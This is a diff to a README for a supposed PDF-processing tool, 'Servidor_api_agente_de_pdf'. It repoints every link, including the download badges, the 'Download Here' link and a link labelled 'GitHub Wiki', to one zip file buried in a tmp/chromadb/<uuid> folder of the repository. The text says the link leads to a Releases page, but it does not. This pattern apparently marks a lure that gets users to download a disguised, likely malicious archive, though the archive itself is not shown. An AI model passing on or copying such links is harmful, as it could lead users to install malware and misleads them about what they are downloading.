@@ -1,6 +1,6 @@
 # 📄 Servidor_api_agente_de_pdf - Smart PDF Processing Made Simple
 
-[![Download](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip%https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip)](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip)
+[![Download](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip%https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip)](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To download the application, visit the following link: [Download Here](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip).
+To download the application, visit the following link: [Download Here](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip).
 
 1. **Go to the Releases Page:** Click on the link above. This will direct you to the Releases section of the repository.
 2. **Choose the Latest Release:** Look for the most recent version listed.
@@ -56,7 +56,7 @@ If you wish to contribute, you can do so by following these guidelines:
 
 ## 🔗 Learn More
 
-To understand more about the features of **Servidor_api_agente_de_pdf**, check the documentation provided within the application or refer to our [GitHub Wiki](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip).
+To understand more about the features of **Servidor_api_agente_de_pdf**, check the documentation provided within the application or refer to our [GitHub Wiki](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip).
 
 ## 🤝 Collaborators
 
@@ -76,4 +76,4 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 Thank you for choosing **Servidor_api_agente_de_pdf**! We hope it makes your PDF processing tasks easier and more efficient.
 
-[![Download](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip%https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip)](https://raw.githubusercontent.com/samub6/Servidor_api_agente_de_pdf/main/tmp/Servidor_api_agente_de_pdf-v3.7.zip)
+[![Download](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip%https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip)](https://github.com/samub6/Servidor_api_agente_de_pdf/raw/refs/heads/main/tmp/chromadb/bacbf3e9-8d25-4127-b056-71b87e470c04/Servidor-agente-api-de-pdf-3.8-beta.5.zip)
